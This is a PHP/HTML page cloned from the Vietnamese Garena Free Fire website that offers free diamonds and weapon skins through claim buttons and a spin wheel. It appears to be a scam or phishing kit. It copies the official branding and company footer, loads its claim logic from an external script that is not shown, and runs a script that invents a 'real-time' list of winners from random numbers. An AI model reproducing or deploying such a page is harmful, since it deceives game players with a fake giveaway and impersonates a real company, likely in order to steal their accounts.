<?php
session_start();
$time = time();
?>
<!DOCTYPE html>
<html lang="en-US" prefix="og: http://ogp.me/ns#">
<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="description" content="FREE FIRE - SỐNG DAI THÀNH HUYỀN THOẠI" />
<link rel="profile" href="http://gmpg.org/xfn/11">
<link rel="pingback" href="https://ff.garena.vn/xmlrpc.php">
<link rel="stylesheet" href="bootstrap/4-0-0-beta-2/css/bootstrap.min.css" integrity="sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb" crossorigin="anonymous">
<script src="https://use.fontawesome.com/46bfddc7ff.js"></script>
<title>FREE FIRE - SỐNG DAI THÀNH HUYỀN THOẠI</title>
<!-- This site is optimized with the Yoast SEO plugin v7.4.1 - https://yoast.com/wordpress/plugins/seo/ -->
<meta name="description" content="GARENA FREE FIRE là tựa game bắn súng sinh tồn đầu tiên tại Việt Nam, mang đến những trải nghiệm sống còn cực kỳ hồi hộp và đầy rẫy những bất ngờ nghẹt thở. Sau khi nhảy dù với 40 người khác từ máy bay xuống hòn đảo, cuộc chiến sinh tử bắt đầu. Nơi đây chỉ tồn tại một quy tắc duy nhất: “săn mồi hoặc trở thành con mồi”."/>
<link rel="canonical" href="index.html" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="website" />
<meta property="og:title" content="FREE FIRE - SỐNG DAI THÀNH HUYỀN THOẠI" />
<meta property="og:description" content="GARENA FREE FIRE là tựa game bắn súng sinh tồn đầu tiên tại Việt Nam, mang đến những trải nghiệm sống còn cực kỳ hồi hộp và đầy rẫy những bất ngờ nghẹt thở. Sau khi nhảy dù với 40 người khác từ máy bay xuống hòn đảo, cuộc chiến sinh tử bắt đầu. Nơi đây chỉ tồn tại một quy tắc duy nhất: “săn mồi hoặc trở thành con mồi”." />
<meta property="og:url" content="https://ff.garena.vn/" />
<meta property="og:site_name" content="FREE FIRE" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:description" content="GARENA FREE FIRE là tựa game bắn súng sinh tồn đầu tiên tại Việt Nam, mang đến những trải nghiệm sống còn cực kỳ hồi hộp và đầy rẫy những bất ngờ nghẹt thở. Sau khi nhảy dù với 40 người khác từ máy bay xuống hòn đảo, cuộc chiến sinh tử bắt đầu. Nơi đây chỉ tồn tại một quy tắc duy nhất: “săn mồi hoặc trở thành con mồi”." />
<meta name="twitter:title" content="FREE FIRE - SỐNG DAI THÀNH HUYỀN THOẠI" />
<meta name="twitter:image" content="https://ff.garena.vn/wp-content/uploads/2019/06/head-bg-chars.jpg" />
<script type='application/ld+json'>{"@context":"https:\/\/schema.org","@type":"WebSite","@id":"#website","url":"https:\/\/ff.garena.vn\/","name":"FREE FIRE","potentialAction":{"@type":"SearchAction","target":"https:\/\/ff.garena.vn\/?s={search_term_string}","query-input":"required name=search_term_string"}}</script>
<meta property="fb:app_id" content="1311615385841456" />
<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css" rel="stylesheet" />
<link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700&display=swap" rel="stylesheet" />
<link href="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/3.0.0/mdb.min.css" rel="stylesheet" />
<link href="../assets/tramsexy.css?<?=$time;?>" rel="stylesheet" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Tri ân Free Fire - Tặng Quà Free Fire Miễn Phí Mới Nhất 2021" />
<meta property="og:description" content="Tri ân Free Fire - Tặng Quà Free Fire Miễn Phí Mới Nhất 2021" />
<meta property="og:image" content="../assets/img/118594380_736793720369972_8612394719123697639_o.jpg" />
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js" type="text/javascript"></script>
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@10" type="text/javascript"></script>

<link rel='dns-prefetch' href='//maxcdn.bootstrapcdn.com' />
<link rel='dns-prefetch' href='//fonts.googleapis.com' />
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
	<link rel='stylesheet' id='wp-block-library-css'  href='wp-includes/css/dist/block-library/style.min.css' type='text/css' media='all' />
<link rel='stylesheet' id='Free Fire theme-main-css'  href='wp-content/themes/freefire/style.css' type='text/css' media='all' />
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script type='text/javascript' src='https://ff.garena.vn/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
		<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
				<style type="text/css" id="wp-custom-css">
			@media screen and (max-width: 1024px) {
   .rating-18 {
       position: absolute !important;
   }
}		</style>
		<style>
		@import url('https://fonts.googleapis.com/css?family=Roboto&display=swap');
	body{
font-family: 'Roboto';
}
@media screen and (max-width: 1024px) {
  img {
    max-width: 100% !important;
    height: auto;
  }
}
#main-nav ul li a {
  font-size: 16px;
}
.video-item figcaption a {
    color: #fff;
    font-size: 1.8rem;
    font-weight: 300;
    text-shadow: none;
}
.video-item figcaption {
    position: absolute;
    width: 100%;
    bottom: 0;
    left: 0;
    background: #ff7d03;
    text-align: center;
    padding: 15px;
    transition: bottom .25s ease;
}
.nhanqua{
    
    text-align: center;
    padding: 0px 5px;

}
.video-item>a:after {
    content: "";
    position: absolute;
    width: 94px;
    height: 94px;
    background: none;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
}
.video-item>a .vid-img {
    width: 100%;
    object-fit: cover;
    transition: transform .25s ease;
    margin-top: -35px;
    margin-bottom: -35px;
}
.video-item{
        height: 200px;
    background-size: auto;
    object-fit: cover;
}
.video-item>a .vid-img {
    width: 100%;
    height: 230px;
    object-fit: contain;
    transition: transform .25s ease;
    margin-top: -35px;
    margin-bottom: -35px;
}
.owl-theme .owl-dots .owl-dot {
    display: inline-block;
    zoom: 1;
    display: none;
    *display: inline;
}
input[type="text"], input[type="email"], input[type="password"], input[type="number"], input[type="url"], input[type="search"], input[type="tel"], input[type="date"], input[type="datalist"], input[type="time"] {
    height: 42px;
    padding: 9px;
    background-color: #29251e;
    display: block;
    width: 90%;
    max-width: -webkit-fill-available;
    border-radius: 6px;
    border: 1px solid #52493c;
    color: #dbd5cd;
    outline: none !important;
    font-style: inherit;
    font-size: 15px;
}
.dangnhap{
    background: #222222;
    border-color: #727272;
    padding: 8px 30px;
}
 .loading {
                background-color: #000000c4;
                top: 0;
                left: 0;
                position: fixed;
                width: 100%;
                height: 100%;
                z-index: 9998;
                display: none;
            }
            .lds-hourglass {
              display: inline-block;
              position: fixed;
              width: 64px;
              height: 64px;
              z-index: 9999;
              top: 45%;
              left: calc(50% - 32px);
            }
            .lds-hourglass:after {
              content: " ";
              display: block;
              border-radius: 50%;
              width: 0;
              height: 0;
              margin: 6px;
              box-sizing: border-box;
              border: 26px solid #fff;
              border-color: #fff transparent #fff transparent;
              animation: lds-hourglass 1.2s infinite;
            }
            @keyframes lds-hourglass {
              0% {
                transform: rotate(0);
                animation-timing-function: cubic-bezier(0.55, 0.055, 0.675, 0.19);
              }
              50% {
                transform: rotate(900deg);
                animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
              }
              100% {
                transform: rotate(1800deg);
              }
            }
</style>
        <script>
                    function loading(show) {
    if(show == true)
        $('.loading').show();
    else
        $('.loading').hide();
}
        </script>
        
</head>
<body class="home page-template page-template-home page-template-home-php page page-id-512">
    <div class="loading"><div class="lds-hourglass"></div></div>

  <div id="wrapper">
    <header id="header">
      <div class="container-fluid">
        <div class="row top-head align-items-center">
          <div class="col-md-12">
                        <a href="index.html" class="logo-site"><img src="wp-content/themes/freefire/images/logo-site.png" alt="Free fire"></a>
            <a href="#" class="menu-mobile"><i class="fa fa-bars"></i></a>
            <div class="mobile-head text-center">
              <img src="wp-content/themes/freefire/images/game-icon.png" alt="" class="game-icon">
              <a href="index.html" class="mobile-logo"><img src="wp-content/themes/freefire/images/logo-mobile.png" alt=""></a>
              <a href="mobile/ff_pid_organica_c.html" class="btn-install"><img src="wp-content/themes/freefire/images/btn-install.png" alt=""></a>
            </div>
            <nav id="main-nav">
              <ul>
                <li><a href="/">Trang chủ</a></li>
                <li><a href="index.html#section-characters" class="scroll-to" data-target="#main-body">Nhân vật</a></li>
                <li><a href="index.html#section-videos" class="scroll-to" data-target=".section-videos">Nhận quà</a></li>
                              </ul>
            </nav>
          </div>
        </div>
      </div>
        <img src="wp-content/themes/freefire/images/head-bg-chars.jpg" class="head-picture" alt="">
      <div class="container-fluid">
        <div class="row head-content">
          <div class="col-md-12 text-center">
            <a href="https://www.youtube.com/watch?v=IiMBIgdViHE" data-aos="fade-up" data-aos-duration="1000" data-aos-delay="400"data-fancybox class="play-head-video">
              <img src="wp-content/themes/freefire/images/play-big.png" alt="">
            </a>
            <div class="app-install" data-aos="fade-up" data-aos-duration="1000" data-aos-offset="-300" data-aos-delay="600">
              <a href="https://play.google.com/store/apps/details?id=com.dts.freefireth"><img src="wp-content/themes/freefire/images/android.png" alt=""></a>
              <a href="https://itunes.apple.com/vn/app/garena-free-fire/id1300146617?mt=8"><img src="wp-content/themes/freefire/images/ios.png" alt=""></a>
            </div>
          </div>
        </div>
      </div>
      <div class="wrap-head-social">
        <div>
          <a href="https://www.facebook.com/freefirevn/" target="_blank"><img src="wp-content/themes/freefire/images/facebook.png" alt=""></a>
          <a href="https://www.youtube.com/channel/UCaXPyn1WCz3YNE_hCOOAoFA" target="_blank"><img src="wp-content/themes/freefire/images/youtube.png" alt=""></a>
          <a href="mobile/ff_pid_organica_c.html" target="_blank"><img src="wp-content/themes/freefire/images/mobile.png" alt=""></a>
        </div>
      </div>
    </header>
    <section id="main-body">
          <div class="section section-videos" style="padding-bottom: 0;" id="section-videos">
      <div class="container">
          <div class="row">  
<div class="col-md-3 mb-4">
<div class="card bg-dark text-white"> <img src="../assets/img/57079679_2413227698701807_5297390513740054528_o-removebg-preview.png" class="card-img" alt="..." /><div class="card-img-overlay"><h5 class="card-title">10.000 kim cương</h5><p class="card-text">Nhận trong 5 phút</p></div></div>
<center>
<button type="button" id="qua1" onclick="nhanqua(1)" class="btn btn-danger mt-2" data-cf-modified-=""><i class="fas fa-gift"></i> Nhận</button>
</center>
</div>
<div class="col-md-3 mb-4">
<div class="card bg-dark text-white"> <img src="../assets/img/134708007_829842567731753_3471716140197814510_o (1).jpg" class="card-img" alt="..." /><div class="card-img-overlay"><h5 class="card-title">Scar Cá Mập Đen</h5><p class="card-text"><span class="badge bg-success">(++) Tốc độ bắn</span><br /><span class="badge bg-success">(+) Sát thương</span><br /><span class="badge bg-danger">(-) Tốc độ thay đạn</span></p></div></div>
<center>
<button type="button" id="qua2" onclick="nhanqua(2)" class="btn btn-danger mt-2" data-cf-modified-=""><i class="fas fa-gift"></i> Nhận</button>
</center>
</div>
<div class="col-md-3 mb-4">
<div class="card bg-dark text-white"> <img src="../assets/img/118594380_736793720369972_8612394719123697639_o.jpg" class="card-img" alt="..." /><div class="card-img-overlay"><h5 class="card-title">MP40 tứ quý</h5><p class="card-text"><span class="badge bg-success">(++) Sát thương</span><br /><span class="badge bg-success">(+) Tốc độ bắn</span><br /><span class="badge bg-danger">(-) Tầm xa</span></p></div></div>
<center>
<button type="button" id="qua3" onclick="nhanqua(3)" class="btn btn-danger mt-2" data-cf-modified-=""><i class="fas fa-gift"></i> Nhận</button>
</center>
</div>
<div class="col-md-3 mb-4">
<div class="card bg-dark text-white"> <img src="../assets/img/130282598_814087092640634_3231164290930313537_o.jpg" class="card-img" alt="..." /><div class="card-img-overlay"><h5 class="card-title">Scar siêu phẩm</h5><p class="card-text"><span class="badge bg-success">(++) Tốc độ bắn</span><br /><span class="badge bg-success">(+) Sát thương</span><br /><span class="badge bg-danger">(-) Băng đạn</span></p></div></div>
<center>
<button type="button" id="qua4" onclick="nhanqua(4)" class="btn btn-danger mt-2" data-cf-modified-=""><i class="fas fa-gift"></i> Nhận</button>
</center>
</div>
</div>
<div class="row mt-4">
<div class="col-md-6 mb-4"><p class="h5">Lịch sử nhận quà</p>
<p class="h6">Thống kê theo thời gian thực</p>
<ul class="list-group mt-3">
<div id="thongke"></div>
</ul>
<script type="text/javascript">
ketqua();
setInterval(ketqua, 500);
function ketqua(){
    var ketqua = '';
    for(i = 1; i <= 5; i++){
        var nguoidung = Math.floor(Math.random() * 100000000000);
        $("#thongke").html(ketqua += '<li class="list-group-item">ID <b>'+nguoidung+'</b> vừa nhận quà thành công!</li>');
    }
}
</script>
</div>
<div class="col-md-6 mb-4">
<div class="vhncardquayso"><img src="../assets/img/113_st_patricks_db (1).gif"></div>
<div class="kimcuong khong phanqua1"><b>9.999</b> <img src="../assets/img/kc.png"><small class="dacbiet">Đặc biệt</small></div>
<div class="kimcuong khong phanqua2"><b>45</b> <img src="../assets/img/kc.png"><small>Thông thường</small></div>
<div class="kimcuong khong phanqua3"><b>200</b> <img src="../assets/img/kc.png"><small>Thông thường</small></div>
<div class="kimcuong khong phanqua4"><b>2.375</b> <img src="../assets/img/kc.png"><small class="dacbiet">Đặc biệt</small></div>
<div class="kimcuong khong phanqua5"><b>950</b> <img src="../assets/img/kc.png"><small class="dacbiet">Dễ trúng</small></div>
<div class="kimcuong khong phanqua6"><b>90</b> <img src="../assets/img/kc.png"><small>Thông thường</small></div>
<div class="kimcuong khong phanqua7"><b>135</b> <img src="../assets/img/kc.png"><small>Thông thường</small></div>
<div class="kimcuong khong phanqua8"><b>9.999</b> <img src="../assets/img/kc.png"><small class="dacbiet">Đặc biệt</small></div>
<div class="kimcuongz">
<div id="quayso_vohuunhan" class="quayso">
<b>Quay số</b>
</div>
</div>
</div>
</div>
</div>


</section>
<footer id="footer">
<div class="container">
	<div class="row">
		<div class="col-md-12 text-center">
			<img src="wp-content/themes/freefire/images/logo-footer.png" alt=""><br><br>
			<p>Công ty TNHH Dịch Vụ Phần Mềm Thiên Bình</p>
			<p>Giấy CNĐKKD số 0106803215, cấp lần đầu ngày 27/03/2015</p>
			<p>Cơ quan cấp: Phòng Đăng ký kinh doanh- Sở Kế hoạch và đầu tư TP Hà Nội</p>
			<p>Địa chỉ trụ sở chính: Tầng 29, tòa nhà Trung tâm Lotte Hà Nội, số 54, đường Liễu Giai, Phường Cống Vị, Quận Ba Đình, Thành phố Hà Nội, Việt Nam.</p>
			<p><a target="_blank" href="index.html" title="">Điều khoản dịch vụ</a> | <a target="_blank" href="index.html" title="">Chính sách bảo mật</a> | <a target="_blank" href="index.html" title="">Chính sách giải quyết tranh chấp </a></p>
		</div>
	</div>
</div>
</footer>

								</div>
							</div>
							<div class="w-100"></div>
							<div class="col-12">
								<div class="wrap-frame">
									<img src="wp-content/themes/freefire/images/video-frame.png" alt="">
																		
								</div>
							</div>
						</div>
					</div>
				</div>
				<a href="#" class="modal-close" data-dismiss="modal"><img src="wp-content/themes/freefire/images/modal-close.png" alt=""></a>
			</div>
		</div>
		</div>
	</div>
<script type='text/javascript' src='https://ff.garena.vn/wp-content/themes/freefire/js/owl.carousel.js?ver=20170605'></script>
<script type='text/javascript' src='https://ff.garena.vn/wp-content/themes/freefire/js/imagesloaded.pkgd.js?ver=20170605'></script>
<script type='text/javascript' src='https://ff.garena.vn/wp-content/themes/freefire/js/jquery.scrollTo.js?ver=20170605'></script>
<script type='text/javascript' src='https://ff.garena.vn/wp-content/themes/freefire/js/jquery.fancybox.js?ver=20170605'></script>
<script type='text/javascript' src='https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js?ver=25102017xza'></script>
<script type='text/javascript' src='https://ff.garena.vn/wp-content/themes/freefire/js/jquery.scrollbar.js?ver=25102017xza'></script>
<script type='text/javascript' src='https://ff.garena.vn/wp-content/themes/freefire/js/aos.js?ver=25102017xza'></script>
<script type='text/javascript' src='https://ff.garena.vn/wp-content/themes/freefire/js/script.js?ver=v6789'></script>
<script type='text/javascript' src='https://ff.garena.vn/wp-includes/js/wp-embed.min.js?ver=5.2.5'></script>
<script type="text/javascript" src="../assets/tramsexy.js?<?=$time;?>"></script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/3.0.0/mdb.min.js"></script>
<script src="https://ajax.cloudflare.com/cdn-cgi/scripts/7089c43e/cloudflare-static/rocket-loader.min.js" data-cf-settings="49" defer=""></script></body>
</body>
</html>
<!--
Performance optimized by W3 Total Cache. Learn more: https://www.w3-edge.com/products/
Object Caching 0/0 objects using disk
Page Caching using disk: enhanced 
Database Caching 3/22 queries in 0.017 seconds using disk
Served from: ff.garena.vn @ 2020-02-23 12:33:05 by W3 Total Cache
-->